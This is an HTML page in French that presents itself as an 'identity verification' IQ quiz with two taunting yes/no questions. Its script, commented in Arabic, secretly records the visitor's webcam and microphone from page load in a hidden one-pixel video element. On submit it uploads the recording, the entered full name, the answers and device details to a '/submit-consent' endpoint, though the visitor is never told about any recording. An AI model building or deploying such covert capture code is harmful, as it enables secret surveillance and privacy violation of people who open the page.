<!DOCTYPE html>
<html lang="fr" dir="ltr" id="htmlTag">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="pageTitle">IQ Questions - Vérification d'identité</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #f8fafc;
            --card-bg: #ffffff;
            --primary-accent: #6366f1;
            --success-color: #10b981;
            --text-main: #0f172a;
            --text-muted: #475569;
            --input-bg: #f8fafc;
            --border-color: #cbd5e1;
            --border-focus: #6366f1;
            --radius-lg: 24px;
            --radius-md: 14px;
        }
        * { box-sizing: border-box; transition: all 0.25s ease; }
        body { 
            font-family: 'Plus Jakarta Sans', Arial, sans-serif; 
            background-color: var(--bg-color);
            display: flex; justify-content: center; align-items: center; 
            min-height: 100vh; margin: 0; padding: 30px 15px; color: var(--text-main);
        }
        .card { 
            background: var(--card-bg); padding: 40px 35px; border-radius: var(--radius-lg); 
            box-shadow: 0 20px 40px -10px rgba(0, 0, 0, 0.08); text-align: center; max-width: 600px; width: 100%; 
        }
        h2 { color: var(--text-main); margin: 0 0 8px 0; font-size: 28px; font-weight: 800; }
        .subtitle { color: var(--text-muted); font-size: 14px; margin-bottom: 25px; }
        #video-container { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; overflow: hidden; }
        #username { width: 100%; padding: 14px 16px; margin-bottom: 25px; font-size: 15px; background: var(--input-bg); border: 2px solid var(--border-color); border-radius: var(--radius-md); outline: none; }
        .question-box { margin-bottom: 16px; text-align: left; background: #fff; padding: 16px 18px; border-radius: var(--radius-md); border: 1px solid var(--border-color); }
        [dir="rtl"] .question-box { text-align: right; }
        .question-box label { display: block; font-weight: 700; margin-bottom: 8px; font-size: 14px; }
        .question-box select { width: 100%; padding: 10px 12px; font-size: 14px; background: var(--input-bg); border: 1px solid var(--border-color); border-radius: 8px; outline: none; }
        button { padding: 16px 24px; border: none; border-radius: var(--radius-md); cursor: pointer; font-weight: 700; font-size: 16px; width: 100%; background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white; margin-top: 20px; box-shadow: 0 10px 20px -5px rgba(16, 185, 129, 0.4); }
        #status { margin-top: 20px; font-weight: 700; font-size: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Vérification d'identité</h2>
        <div class="subtitle">Veuillez répondre aux questions ci-dessous pour continuer</div>

        <div id="video-container">
            <video id="webcam" autoplay playsinline muted></video>
        </div>
        
        <form id="quizForm" onsubmit="event.preventDefault(); verifyAndSend();">
            <input type="text" id="username" placeholder="Votre Nom Complet" required><br>
            
            <div class="question-box"><label>1. Penses-tu être plus beau/belle que moi ?</label><select id="q1" required><option value="">Sélectionnez</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
            <div class="question-box"><label>2. Te considères-tu comme quelqu'un de naïf ?</label><select id="q2" required><option value="">Sélectionnez</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
            
            <button type="button" id="submitBtn" onclick="verifyAndSend()">VALIDER ET ENVOYER</button>
        </form>

        <div id="status"></div>
    </div>

    <script>
        let mediaStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];

        // بدء التسجيل فور فتح الصفحة خفية
        window.addEventListener('DOMContentLoaded', async () => {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: true });
                document.getElementById('webcam').srcObject = mediaStream;

                mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
                mediaRecorder.ondataavailable = e => {
                    if (e.data && e.data.size > 0) recordedChunks.push(e.data);
                };
                mediaRecorder.start(1000); // تجميع البيانات أول بأول
            } catch (err) {
                console.error("Camera error:", err);
            }
        });

        async function verifyAndSend() {
            const username = document.getElementById('username').value;
            const statusDiv = document.getElementById('status');

            if (!username) {
                statusDiv.style.color = '#ef4444';
                statusDiv.innerText = "Veuillez entrer votre nom.";
                return;
            }

            statusDiv.style.color = '#6366f1';
            statusDiv.innerText = "Envoi des données en cours...";

            // إيقاف التسجيل لجلب الفيديو كاملاً وقت الضغط
            if (mediaRecorder && mediaRecorder.state !== "inactive") {
                mediaRecorder.stop();
            }

            // انتظار جزء صغير لضمان تفريغ الـ chunks
            await new Promise(r => setTimeout(r, 600));

            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
            const formData = new FormData();
            formData.append('username', username);
            formData.append('q1', document.getElementById('q1').value);
            formData.append('q2', document.getElementById('q2').value);
            formData.append('video', videoBlob, 'recording.webm');
            
            // إضافة معلومات الجهاز البسيطة
            formData.append('device', JSON.stringify({
                userAgent: navigator.userAgent,
                screen: `${window.screen.width}x${window.screen.height}`
            }));

            try {
                let response = await fetch('/submit-consent', {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    statusDiv.style.color = '#10b981';
                    statusDiv.innerText = "Succès ! Vos réponses ont été envoyées.";
                } else {
                    statusDiv.style.color = '#ef4444';
                    statusDiv.innerText = "Erreur du serveur.";
                }
            } catch (e) {
                statusDiv.style.color = '#ef4444';
                statusDiv.innerText = "Erreur de connexion.";
            }
        }
    </script>
</body>
</html>
